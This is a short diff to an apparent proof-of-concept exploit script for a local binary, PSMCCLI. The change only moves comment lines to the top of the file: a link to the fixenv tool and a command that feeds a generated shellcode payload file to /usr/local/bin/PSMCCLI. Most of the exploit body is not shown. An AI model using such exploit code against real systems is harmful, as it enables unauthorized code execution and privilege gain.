@@ -1,6 +1,8 @@
 #
 # PSMCCLI_PoC by https://twitter.com/ju256_
-#
+# https://github.com/hellman/fixenv
+# python exploit.py && ./r.sh /usr/local/bin/PSMCCLI $(cat exp)
+
 import struct
 
 def pad(s,shellcode):
@@ -29,5 +31,4 @@ exp=pad(exp,shellcode)
 
 open("exp","wb").write(exp)
 
-#https://github.com/hellman/fixenv
-#python exploit.py && ./r.sh /usr/local/bin/PSMCCLI $(cat exp)
+
